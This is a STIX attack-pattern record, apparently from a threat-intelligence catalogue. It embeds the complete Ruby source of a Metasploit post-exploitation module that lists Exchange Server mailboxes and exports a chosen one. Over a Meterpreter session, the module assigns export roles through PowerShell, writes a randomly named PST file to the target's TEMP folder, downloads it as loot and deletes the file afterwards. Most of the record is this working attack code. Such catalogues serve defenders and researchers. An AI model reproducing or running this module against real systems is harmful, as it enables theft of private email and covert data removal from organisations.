{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--b8711496-3584-4667-9f17-d2b5b66cf550",
    "created": "2024-08-14T16:33:05.058202Z",
    "modified": "2024-08-14T16:33:05.058206Z",
    "name": "Windows Gather Exchange Server Mailboxes",
    "description": " This module will gather information from an on-premise Exchange Server running on the target machine.  Two actions are supported: LIST (default action): List basic information about all Exchange servers and mailboxes hosted on the target. EXPORT: Export and download a chosen mailbox in the form of a .PST file, with support for an optional filter keyword.  For a list of valid filters, see https://docs.microsoft.com/en-us/exchange/filterable-properties-for-the-contentfilter-parameter  The executing user has to be assigned to the \"Organization Management\" role group for the module to successfully run.  Tested on Exchange Server 2010 on Windows Server 2012 R2 and Exchange Server 2016 on Windows Server 2016.  'License' => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/post/windows/gather/exchange.rb",
            "external_id": "exchange.rb"
        },
        {
            "source_name": "reference",
            "url": "https://github.com/sophoslabs/metasploit_gather_exchange"
        },
        {
            "source_name": "reference",
            "url": "https://news.sophos.com/en-us/2021/03/09/sophoslabs-offensive-security-releases-post-exploitation-tool-for-exchange/"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Post\n  include Msf::Post::Windows::Registry\n  include Msf::Post::Windows::Powershell\n  include Msf::Post::File\n\n  def initialize(info = {})\n    super(\n      update_info(\n        info,\n        'Name' => 'Windows Gather Exchange Server Mailboxes',\n        'Description' => %q{\n          This module will gather information from an on-premise Exchange Server running on the target machine.\n\n          Two actions are supported:\n          LIST (default action): List basic information about all Exchange servers and mailboxes hosted on the target.\n          EXPORT: Export and download a chosen mailbox in the form of a .PST file, with support for an optional filter keyword.\n\n          For a list of valid filters, see https://docs.microsoft.com/en-us/exchange/filterable-properties-for-the-contentfilter-parameter\n\n          The executing user has to be assigned to the \"Organization Management\" role group for the module to successfully run.\n\n          Tested on Exchange Server 2010 on Windows Server 2012 R2 and Exchange Server 2016 on Windows Server 2016.\n        },\n        'License' => MSF_LICENSE,\n        'Author' => [ 'SophosLabs Offensive Security team' ],\n        'References' => [\n          [ 'URL', 'https://github.com/sophoslabs/metasploit_gather_exchange' ],\n          [ 'URL', 'https://news.sophos.com/en-us/2021/03/09/sophoslabs-offensive-security-releases-post-exploitation-tool-for-exchange/' ],\n        ],\n        'Platform' => [ 'win' ],\n        'Arch' => [ ARCH_X86, ARCH_X64 ],\n        'SessionTypes' => [ 'meterpreter' ],\n        'Actions' => [\n          [ 'LIST', { 'Description' => 'List basic information about all Exchange servers and mailboxes hosted on the target' } ],\n          [ 'EXPORT', { 'Description' => 'Export and download a chosen mailbox in the form of a .PST file, with support for an optional filter keyword' } ],\n        ],\n        'DefaultAction' => 'LIST',\n        'Compat' => {\n          'Meterpreter' => {\n            'Commands' => %w[\n              stdapi_fs_stat\n            ]\n          }\n        },\n        'Notes' => {\n          'Stability' => [CRASH_SAFE],\n          'SideEffects' => [IOC_IN_LOGS],\n          'Reliability' => []\n        }\n      )\n    )\n\n    register_options(\n      [\n        OptString.new('FILTER', [ false, '[for EXPORT] Filter to use when exporting a mailbox (see description)' ]),\n        OptString.new('MAILBOX', [ false, '[for EXPORT, required] Mailbox to export' ]),\n      ]\n    )\n\n    register_advanced_options(\n      [\n        OptInt.new('TIMEOUT', [true, 'The maximum time (in seconds) to wait for any Powershell scripts to complete', 600]),\n        OptFloat.new('DownloadSizeThreshold', [true, 'The file size of export results after which a prompt will appear to confirm the download, in MB (0 for no threshold)', 50.0]),\n        OptBool.new('SkipLargeDownloads', [true, 'Automatically skip downloading export results that are larger than DownloadSizeThreshold (don\\'t show prompt)', false])\n      ]\n    )\n  end\n\n  def execute_exchange_script(command)\n    # Generate random delimiters for output coming from the powershell script\n    output_start_delim = \"<#{Rex::Text.rand_text_alphanumeric(16)}>\"\n    output_end_delim = \"</#{Rex::Text.rand_text_alphanumeric(16)}>\"\n\n    base_script = File.read(File.join(Msf::Config.data_directory, 'post', 'powershell', 'exchange.ps1'))\n    # A hash is used as the replacement argument to avoid issues with backslashes in command\n    psh_script = base_script.sub('_COMMAND_', '_COMMAND_' => command)\n    # Insert the random delimiters in place of the placeholders\n    psh_script.gsub!('<output>', output_start_delim)\n    psh_script.gsub!('</output>', output_end_delim)\n    compressed_script = compress_script(psh_script)\n    cmd_out, _runnings_pids, _open_channels = execute_script(compressed_script, datastore['TIMEOUT'])\n    while (d = cmd_out.channel.read)\n      # Only print the output coming from PowerShell that is inside the delimiters\n      d.scan(/#{output_start_delim}(.*?)#{output_end_delim}/) do |b|\n        b[0].split('<br>') do |l|\n          print_line(l.to_s)\n        end\n      end\n    end\n  end\n\n  def user_confirms_download?\n    # Prompt the user to confirm the download. Return true if confirmed, false otherwise\n    return false unless user_input.respond_to?(:pgets)\n\n    old_prompt = user_input.prompt\n    user_input.prompt = 'Are you sure you want to continue? [y/N] '\n    cont = user_input.pgets\n    user_input.prompt = old_prompt\n\n    return cont.match?(/^y/i)\n  end\n\n  def export_mailboxes(mailbox, filter)\n    # Get the target's TEMP path and generate a random filename to serve as the save path for the export action\n    temp_folder = get_env('TEMP')\n    random_filename = \"#{Rex::Text.rand_text_alpha(16)}.tmp\"\n    temp_save_path = \"#{temp_folder}\\\\#{random_filename}\"\n\n    # The Assign-Roles command is responsible for assigning the roles necessary for exporting,\n    # It's executed in a separate PowerShell session because these changes don't take effect until a new session is created\n    execute_exchange_script('Assign-Roles')\n    execute_exchange_script(\"Export-Mailboxes \\\"#{mailbox}\\\" \\\"#{filter}\\\" \\\"#{temp_save_path}\\\"\")\n\n    # After script is done executing, check if the export save path exists on the target\n    if !file_exist?(temp_save_path)\n      print_error('Export file not created on target machine. Aborting.')\n      return\n    end\n\n    # Get the size of the newly made export file\n    stat = session.fs.file.stat(temp_save_path)\n    mb_size = (stat.stathash['st_size'] / 1024.0 / 1024.0).round(2)\n    print_status(\"Resulting export file size: #{mb_size} MB\")\n    if datastore['DownloadSizeThreshold'] > 0 && mb_size > datastore['DownloadSizeThreshold']\n      print_warning(\"The resulting export file is larger than current threshold (#{datastore['DownloadSizeThreshold']} MB)\")\n      print_warning('You can reduce the size of the export file by using the FILTER option to refine the amount of exported mail items.')\n\n      if datastore['SkipLargeDownloads'] || !user_confirms_download?\n        print_error('Not downloading oversized export file.')\n        rm_f(temp_save_path)\n        return\n      end\n    end\n\n    # Download file using the loot system\n    loot = store_loot('PST', 'application/vnd.ms-outlook', session, read_file(temp_save_path), 'export.pst', \"PST export of mailbox #{mailbox}\")\n    print_good(\"PST saved in: #{loot}\")\n\n    # Delete file from target\n    rm_f(temp_save_path)\n  end\n\n  def list_mailboxes\n    execute_exchange_script('List-Mailboxes')\n  end\n\n  def run\n    # Check if Exchange Server is installed on the target by checking the registry\n    if registry_key_exist?('HKLM\\Software\\Microsoft\\ExchangeServer')\n      print_good('Exchange Server is present on target machine')\n    else\n      fail_with(Failure::Unknown, 'Exchange Server is not present on target machine')\n    end\n\n    # Check if PowerShell is installed on the target\n    if have_powershell?\n      print_good('PowerShell is present on target machine')\n    else\n      fail_with(Failure::Unknown, 'PowerShell is not present on target machine')\n    end\n\n    mailbox = datastore['MAILBOX']\n    filter = datastore['FILTER']\n\n    case action.name\n    when 'LIST'\n      print_good('Listing reachable servers and mailboxes: ')\n      list_mailboxes\n    when 'EXPORT'\n      if mailbox.nil? || mailbox.empty?\n        fail_with(Failure::BadConfig, 'Option MAILBOX is required for action EXPORT')\n      else\n        print_good(\"Exporting mailbox '#{mailbox}': \")\n        export_mailboxes(mailbox, filter)\n      end\n    else\n      print_error(\"Unknown action: #{action.name}\")\n    end\n  end\nend\n",
    "x_mitre_platforms": [
        "[ 'win' ]"
    ]
}